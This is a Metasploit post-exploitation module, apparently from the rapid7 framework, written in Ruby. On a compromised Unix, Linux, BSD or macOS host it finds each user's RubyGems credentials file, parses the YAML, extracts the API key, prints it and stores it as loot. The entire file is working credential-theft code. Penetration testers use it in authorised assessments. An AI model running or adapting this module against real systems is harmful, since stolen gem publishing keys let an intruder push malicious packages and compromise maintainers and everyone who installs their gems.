##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'yaml'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Gather RubyGems API Key',
        'Description' => %q{
          This module obtains a user's RubyGems API key from ~/.gem/credentials
          or the default XDG path ~/.local/share/gem/credentials.
        },
        'Author' => [
          'Jonathan Claudius <jclaudius[at]trustwave.com>',
          'Brandon Myers <bmyers[at]trustwave.com>'
        ],
        'Platform' => %w[bsd linux osx unix],
        'SessionTypes' => %w[shell],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def run
    print_status('Finding RubyGems credential files')
    paths = enum_user_directories.flat_map { |dir| ["#{dir}/.gem/credentials", "#{dir}/.local/share/gem/credentials"] }
    paths = paths.select { |path| file?(path) && readable?(path) }

    if paths.empty?
      print_error('No users found with a readable RubyGems credentials file')
      return
    end

    download_key(paths)
  end

  def extract_key(path)
    data = read_file(path)
    return if data.nil? || data.empty?

    # RubyGems writes YAML with symbol keys and can include named host keys.
    credentials = YAML.safe_load(data, permitted_classes: [Symbol])
    return unless credentials.is_a?(Hash)

    key = credentials[:rubygems_api_key] || credentials['rubygems_api_key']
    return key if key.is_a?(String) && !key.empty?

    credentials.values.find { |value| value.is_a?(String) && !value.empty? }
  rescue Psych::Exception => e
    vprint_error("Cannot parse RubyGems credentials #{path}: #{e.message}")
    elog("Cannot parse RubyGems credentials #{path}", error: e)
    nil
  end

  def download_key(paths)
    print_status("Looting #{paths.count} files")
    paths.each do |path|
      path.chomp!
      next if ['.', '..'].include?(path)

      rubygems_api_key = extract_key(path)
      next unless rubygems_api_key

      print_good("Found a RubyGems API key: #{rubygems_api_key}")

      loot_path = store_loot(
        'rubygems.apikey',
        'text/plain',
        session,
        rubygems_api_key,
        'rubygems_api_key.txt',
        'RubyGems API key'
      )

      print_good("RubyGems API key stored in #{loot_path}")
    end
  end
end
